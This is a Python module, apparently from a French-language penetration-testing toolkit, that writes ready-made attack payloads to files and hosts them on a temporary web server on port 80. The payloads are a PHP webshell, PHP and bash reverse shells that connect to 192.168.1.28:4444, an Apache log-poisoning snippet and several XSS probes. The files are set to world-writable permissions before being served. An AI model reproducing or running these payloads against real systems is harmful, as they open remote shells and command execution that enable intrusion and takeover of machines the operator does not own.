import os
import socket
import subprocess
import shutil
from colorama import Fore, Style


resume = "Serveur web automatisé avec répertoire temporaire de payloads prêts à l'emploi"
description = """WebPload est un module qui automatise entièrement la création et la gestion 
d'un serveur web Python temporaire pour héberger des payloads.

Fonctionnalités automatisées :
- Création et suppression automatique d'un serveur web Python sur le port 80
- Génération automatique d'un répertoire temporaire 'ploads' contenant les payloads
- Création automatique des fichiers de payloads prêts à l'emploi
- Nettoyage automatique du répertoire temporaire à la fermeture

Les payloads générés automatiquement incluent :
- Webshells PHP
- Reverse shells (PHP, Bash)
- Scripts XSS (JavaScript) 
- Pages HTML basiques
- Et plus encore...

Le serveur et les fichiers sont temporaires et sont automatiquement supprimés à la fermeture du module."""

pload = {
    "php": {
        "webshell": "<?php system($_GET['cmd']); ?>",
        "reverse_shell": "php -r '$sock=fsockopen(\"192.168.1.28\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "logger": "<?php file_put_contents('/var/log/apache2/access.log', $_GET['cmd']); ?>",
        "index": "<?php echo \"My first PHP script!\"; ?>"
    },

    "js": {
        "xss_script": "<script>alert('XSS');</script>",
        "xss_iframe": "<iframe src=javascript:alert('XSS')></iframe>",
        "xss_img": "<img src=x onerror=alert('XSS')>"
    },

    "html": {
        "Hello_world": "<html><body><h1>Hello World !\nWebPload Open !</h1></body></html>",
        "webshell_php": "<html><?php system($_GET['cmd']); ?></html>"
    },
    
    "bash": {
        "reverse_shell": "bash -i >& /dev/tcp/192.168.1.28/4444 0>&1"
    }

}

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

def main():
    
    # Vérifie si un serveur web python est actif
    server_active = False
    for proc in os.popen('ps aux'):
        if 'python -m http.server 80' in proc:
            server_active = True
            break
    
    if server_active:
        # Si il y a un serveur web python : demande a l'utilisateur si il veux fermer le WebPload
        close_server = input(Fore.LIGHTRED_EX + "Un serveur web est actif. Voulez-vous fermer le WebPload? (o/N): " + Style.RESET_ALL)
        if close_server.lower() in ['o', 'oui', 'yes', 'y']:
            print(Fore.LIGHTRED_EX + "Fermeture du serveur web..." + Style.RESET_ALL)
            os.system("pkill -f 'python -m http.server 80'")
            if os.path.exists(os.path.dirname(__file__)+'/ploads'):
                shutil.rmtree(os.path.dirname(__file__)+'/ploads')
    else:
        # Si non vérifie si le port 80 est libre
        if not is_port_in_use(80):
            # Si il n'y a pas de serveur web python et que le port 80 est libre : demande a l'utilisateur si il veux ouvrir un WebPload
            open_server = input(Fore.LIGHTGREEN_EX + "Le port 80 est libre. Voulez-vous ouvrir un WebPload? (o/N): " + Style.RESET_ALL)
            if open_server.lower() in ['o', 'oui', 'yes', 'y']:
                ip_lan = subprocess.check_output("ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'", shell=True).decode().strip()
                print(Fore.LIGHTGREEN_EX + f"Ouverture du serveur web... Disponible sur : http://{ip_lan}" + Style.RESET_ALL)
                # Vérifie si le repertoire ploads existe dans le repertoire du fichier
                if os.path.exists(os.path.dirname(__file__)+'/ploads'):
                    # Si il existe, supprimer le repertoire
                    shutil.rmtree(os.path.dirname(__file__)+'/ploads')
                # Créer le repertoire
                os.makedirs(os.path.dirname(__file__)+'/ploads')

                
                # Créer dans le repertoire les fichiers contenant les payloads du dictionnaire dans le bon format
                for key, value in pload.items():
                    for payload_name, payload in value.items():
                        file_path = os.path.dirname(__file__)+'/ploads/'+payload_name+'.'+key
                        if not os.path.exists(file_path):
                            with open(file_path, 'w') as f:
                                f.write(payload)
                            # Définir les permissions 777 sur le fichier créé
                            os.chmod(file_path, 0o777)
                
                # Ouvre un serveur web python en silencieux sur le port 80
                subprocess.Popen(['python', '-m', 'http.server', '80'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,cwd=os.path.dirname(__file__)+'/ploads')

        else:
            # Si il n'y a pas de serveur web python et que le port 80 est occupé : affiche une erreur
            print(Fore.LIGHTRED_EX + "Erreur: Le port 80 est occupé." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
